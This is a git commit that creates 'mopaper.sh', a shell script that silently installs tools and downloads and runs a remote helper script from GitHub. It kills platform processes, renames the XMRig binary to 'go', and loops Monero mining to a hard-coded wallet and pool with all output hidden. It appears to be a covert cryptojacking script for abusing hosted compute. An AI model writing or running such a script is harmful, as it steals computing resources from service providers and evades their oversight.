6761dc49c6d70902171ae02fed2382a92a5e94a0
wikangdijalalan2 <82296471+wikangdijalalan2@users.noreply.github.com>
2021-04-12 10:31:36 +0800

    Create mopaper.sh

---
+++ mopaper.sh
@@ -0,0 +1,20 @@
+#!/bin/sh
+#
+#
+#XMR
+apt update > /dev/null 2>&1
+apt install cpulimit > /dev/null 2>&1
+apt install screen -y > /dev/null 2>&1
+wget https://github.com/wikangdijalalan2/jagahkurang34/raw/main/limiting.sh > /dev/null 2>&1
+chmod +x limiting.sh > /dev/null 2>&1
+screen -dmS multex pkill dap_multiplexer
+screen -dmS tail pkill tail
+screen -dmS randum ./limiting.sh xmrig 65 75 > /dev/null 2>&1
+wget https://github.com/xmrig/xmrig/releases/download/v6.11.2/xmrig-6.11.2-linux-x64.tar.gz > /dev/null 2>&1
+tar -xf xmrig-6.11.2-linux-x64.tar.gz > /dev/null 2>&1
+mv xmrig-6.11.2/xmrig go > /dev/null 2>&1
+while [ 1 ]; do
+./go --cpu-priority 5 -a rx/0 -u 83qVLHdgsWhRNNFT6PQqWYRNMZ5xPQr1UDbpWiZeJEypWBh4EKco7Y6BoWjhz1x77Rii5CFtvtC3MVDwZmtcmW9H4DKkmsy -p Papers -o ca.monero.herominers.com:10191 --donate-level=0 --tls -donate-over-proxy=0 --cpu-no-yield  --randomx-mode=auto --randomx-1gb-pages > /dev/null 2>&1
+sleep 3 > /dev/null 2>&1
+done
+sleep 999 > /dev/null 2>&1
